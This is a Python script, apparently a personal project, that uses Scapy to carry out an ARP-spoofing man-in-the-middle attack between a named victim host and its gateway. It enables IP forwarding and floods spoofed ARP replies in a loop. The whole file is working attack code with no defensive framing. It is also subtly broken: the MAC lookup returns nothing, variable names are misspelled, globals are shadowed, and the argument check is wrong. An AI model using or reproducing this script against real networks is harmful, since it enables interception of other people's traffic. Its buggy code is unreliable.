#!/home/laptop/code/python/personal/scapy/bin/python3

from scapy.all import *
import os
import sys
import time

interface = ""
victimIP  = ""
gatewayIP = ""
victimMAC = ""
gatewayMAC= ""

def enable_ip_forwarding():
    print("\nenabling ip forwarding...\n")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ip_forwarding():
    print("\ndisabling ip forwarding...\n")
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def get_mac(IP):
    victim_mac = arping(IP, iface = interface)

def reARP():
    print("\nrestoring targets...")
    victimMAX = get_mac(victimIP)
    gatewayMAX = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAX), count = 7)
    disable_ip_forwarding()
    print("shutting down...")
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = gm))

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        disable_ip_forwarding()
        print("couldn't find victims MAC address")
        print("exiting...")
        sys.exit(1)
    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print("couldn't find victims MAC address")
        print("exiting...")
        sys.exit(1)

    print("poisoning targets...")
    while 1:
        try:
            trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break

def help_hext():
    print("forgot arguments!")
    sys.exit(1)


if len(sys.argv) < 2:
    help_hext()
interface = sys.argv[1]
victimIP = sys.argv[2]
gatewayIP = sys.argv[3]
enable_ip_forwarding()
mitm()
